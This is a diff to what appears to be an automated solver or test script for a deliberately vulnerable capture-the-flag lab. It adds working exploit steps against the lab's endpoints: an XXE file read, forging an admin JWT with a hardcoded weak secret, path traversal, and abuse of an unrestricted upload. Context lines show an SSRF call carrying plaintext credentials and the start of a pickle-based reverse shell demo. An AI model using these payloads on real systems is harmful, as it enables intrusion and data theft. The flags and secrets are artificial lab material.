@@ -89,6 +89,49 @@ check("S6 pickle RCE", '"unpickled"' in r.text and "uid=" in r.text)
 r = requests.get(f"{BASE}/api/fetch", params={"url": "http://127.0.0.1:1399/auth?user=svc_dc&pass=S3rv1c3_P@ss!_2026"}, timeout=8)
 check("S7 dc auth flag4", "flag{D0m41n_C0ntr0ll3r_0wn3d}" in r.text)
 
+# stage8: file upload + dir listing
+r = requests.post(f"{BASE}/api/upload", files={"file": ("probe.txt", b"hello"), }, timeout=8)
+check("S8 upload accepts file", "上传成功" in r.text)
+lst = requests.get(f"{BASE}/uploads/", timeout=8)
+check("S8 uploads dir listing", "flag5_upload.txt" in lst.text)
+f5 = requests.get(f"{BASE}/uploads/flag5_upload.txt", timeout=8)
+check("S8 flag5", "flag{Unr3str1ct3d_Upl04d}" in f5.text)
+
+# stage9: XXE
+xxe = f'''<?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY xxe SYSTEM "file://{os.path.join(ROOT, 'web', 'flag6_xxe.txt')}">]>
+<root><name>&xxe;</name></root>'''
+r = requests.post(f"{BASE}/api/parse_xml", data={"xml": xxe}, timeout=8)
+check("S9 XXE flag6", "flag{Xx3_1s_D4ng3r0us}" in r.text)
+
+# stage10: JWT forgery
+tok = requests.get(f"{BASE}/api/jwt/token", timeout=8).json()["token"]
+hdr, pay, sig = tok.split(".")
+def b64u(s): return s.encode() if isinstance(s,str) else s
+import base64 as _b
+import hmac as _h, hashlib as _hl, json as _j
+def dec(s): return _b.urlsafe_b64decode(s + "="*(-len(s)%4))
+def enc(o):
+    if isinstance(o, str): o = o.encode()
+    return _b.urlsafe_b64encode(o).rstrip(b"=").decode()
+payload_new = dec(pay); payload_new = json.loads(payload_new)
+payload_new["role"] = "admin"
+seg = enc(json.dumps({"alg":"HS256","typ":"JWT"})) + "." + enc(json.dumps(payload_new))
+sig2 = enc(_h.new(b"super_secret_key_123", seg.encode(), _hl.sha256).digest())
+fake = seg + "." + sig2
+r = requests.get(f"{BASE}/api/jwt/data", headers={"Authorization": "Bearer " + fake}, timeout=8)
+check("S10 JWT forge flag7", "flag{Jwt_S3cr3t_T00_W34k}" in r.text)
+
+# stage11: path traversal
+r = requests.get(f"{BASE}/api/download", params={"file": "../flag8_traversal.txt"}, timeout=8)
+check("S11 traversal flag8", "flag{Tr4v3rs4l_K1ll5_T4rget}" in r.text)
+
+# stage12: /lab panel + progress API
+r = requests.get(f"{BASE}/lab", timeout=8)
+check("S12 /lab panel reachable", "BIOHAZARD" in r.text.upper())
+r = requests.get(f"{BASE}/api/progress", timeout=8)
+check("S12 progress api ok", r.json()["total_flags"] >= 8)
+
 # extra: reverse shell payload demo
 class Rev:
     def __reduce__(self):
